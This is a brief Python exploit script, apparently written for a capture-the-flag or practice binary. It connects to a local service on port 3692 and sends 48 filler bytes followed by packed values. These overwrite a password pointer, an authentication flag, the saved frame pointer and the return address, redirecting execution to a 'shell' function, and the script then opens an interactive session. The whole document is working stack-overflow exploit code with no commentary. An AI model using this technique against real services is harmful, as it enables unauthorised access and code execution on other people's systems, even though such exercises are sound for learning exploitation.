
import socket
import telnetlib
from struct import pack

shell = 0x08048624
data_sec = 0x0804a000
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 3692))
#r.sendline( "A" * 48 +
s.send( "A" * 48 +
                      # password, authen, stack align, stack align, old ebp, eip
        pack("<IIIIII", data_sec, 0x1, 0x41414141, 0x41414141, 0x41414141, shell) +
        "\n"
        )
t = telnetlib.Telnet()
t.sock = s
t.interact()


